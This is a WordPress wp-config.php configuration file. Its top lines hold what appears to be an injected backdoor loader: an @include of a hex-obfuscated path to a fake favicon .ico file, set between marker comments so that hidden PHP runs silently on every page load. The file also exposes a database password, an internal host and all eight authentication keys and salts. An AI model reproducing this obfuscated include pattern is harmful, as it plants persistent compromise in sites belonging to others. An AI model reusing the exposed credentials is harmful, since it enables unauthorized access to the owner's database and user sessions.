<?php
/*e29b2*/

@include "\x2fhom\x65/st\x61rtu\x70/pu\x62lic\x5fhtm\x6c/wp\x2dinc\x6cude\x73/Re\x71ues\x74s/R\x65spo\x6ese/\x66avi\x63on_\x36d19\x343.i\x63o";

/*e29b2*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'startup_wp343');

/** MySQL database username */
define('DB_USER', 'startup_wp343');

/** MySQL database password */
define('DB_PASSWORD', '4R5)09Sp.D');

/** MySQL hostname */
define('DB_HOST', '10.0.10.32');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'mt4fsatl1qeyh13ayl0vvan4klatldprin1ckvxo5jpwp5mgeo8uwvjgrb4ef9il');
define('SECURE_AUTH_KEY',  'eapoitbm7qeyoqn9047eulb7apcjcnl6mini8axnc7cnocc0xtqywqwehd7oc5d6');
define('LOGGED_IN_KEY',    'riahovackwuimkbzrbguobxyzikjcdk00qfcwez9mtqgwz4kpysk5jsgikx79prw');
define('NONCE_KEY',        'gfb2cwyocbhxzy1nxgrbqv545jlbpic5k2woceh3zoc0fanmbf2j8l5ra9qjzczt');
define('AUTH_SALT',        'duv9ek9kxzvw50kaaq3bdikb9q2mfxdn9mdyvnofd0nkdn9t8j6qawk7tzivdjkj');
define('SECURE_AUTH_SALT', 'qdvmno3awaqo2yypt0ibnlyy9bunpcafpmzbrzkvilo0rmzp7wwjtkvxd3nortyr');
define('LOGGED_IN_SALT',   'umiilyfuiyhpqmmyrfetffjkbdihxz33pauiektt3bfdaelmtnk0x4mh6wkkmqo0');
define('NONCE_SALT',       '4cccgzirjvn8gh3evs9q9gkgdmbewpfi16x2bld5cxxsfyss8srimihq1gtskb8f');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wpah_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
